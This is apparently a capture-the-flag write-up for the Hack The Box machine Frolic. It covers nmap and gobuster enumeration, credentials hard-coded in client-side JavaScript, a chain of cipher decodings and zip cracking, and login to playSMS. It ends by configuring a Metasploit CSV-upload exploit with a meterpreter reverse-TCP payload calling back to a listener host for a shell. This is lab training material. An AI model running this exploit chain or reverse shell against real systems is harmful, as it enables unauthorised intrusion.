#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 11:24 EDT
Nmap scan report for 10.10.10.111
Host is up (0.100s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2021-08-01T20:54:52+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-01T15:24:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.69 seconds
```
#enumeration 
opening port 9999 we got a link
Thank you for using nginx. http://forlic.htb:1880 
and interestingly it was an open port where i got red node but got nothing useful exploits on it
now ran gobuster scan for both the ports 
```
gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/01 11:45:40 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 178]
/.htaccess            (Status: 403) [Size: 178]
/.htpasswd            (Status: 403) [Size: 178]
/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]   
/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/] 
```
/admin we have a login page that showd crack me
In this http://10.10.10.111:9999/backup/user.txt I got user admin
and in the password.txt got a password "password - imnothuman"
Now tried to log into the /admin and the red node as well both failed and the 
admin page showed 2 attempts only xD : (
I also tried to login to the /dev and /test both failed now clueless.
well suddnly i remenbered i had forgot to check the source code
and so i cheked it
and we got the password in the js file
```
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```
ciphers xD
as expected from a crypto box
used deocde.fr identifier and got something as BULB! and Ook!
they decrypted and said ```/asdiSIAJJ0QWE9JAS```
another one mfc
which was a b64 text but it on decoding gave extension of a zip file 
so serched about it and got a few articles
https://www.igorkromin.net/index.php/2017/04/26/base64-encode-or-decode-on-the-command-line-without-installing-extra-tools-on-linux-windows-or-macos/
Converted it to zip and cracked the password with john and it was ```password```
then got a hex converted from hex then from b64 then from brain fuck to finaaly get 
```idkwhatispass```
but I couldn't understand what to do with this pass so I again started seraching through various directories.
```
gobuster dir -u http://10.10.10.111:9999/dev/ -w /usr/share/seclists/Discovery/Web-Content/big.txt                                                  130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/dev/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/03 00:47:49 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 178]
/.htaccess            (Status: 403) [Size: 178]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
/test                 (Status: 200) [Size: 5]
```
```
gobuster dir -u http://10.10.10.111:9999/backup/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/backup/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/03 00:52:04 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 178]
/.htpasswd            (Status: 403) [Size: 178]
/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/loop/]
```
Now,visited this directories one by one
I the /dev/backup I got a directory``` /playsms```
opening the http://10.10.10.111:9999/playsms/index.php?app=main&inc=core_auth&route=login I got a login page
Now guessed the user and pass ```admin:idkwhatispass```and we are in.
```
searchsploit playsms            
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                          | php/remote/44598.rb
PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)                                          | php/remote/48335.rb
PlaySms 0.7 - SQL Injection                                                                                                 | linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                              | php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                       | php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                                                     | php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                | php/webapps/30177.txt
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                          | php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                            | php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                      | php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                                                                         | php/webapps/42038.txt
PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                                                  | php/webapps/48199.txt
```
Let's try the metasploit one first.
``` 2  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
```
used this one at first
```

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   idkwhatispass    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.111     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      9999             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /playsms         yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4
```
set the options as shown and run
and we get the reverse shell of the user

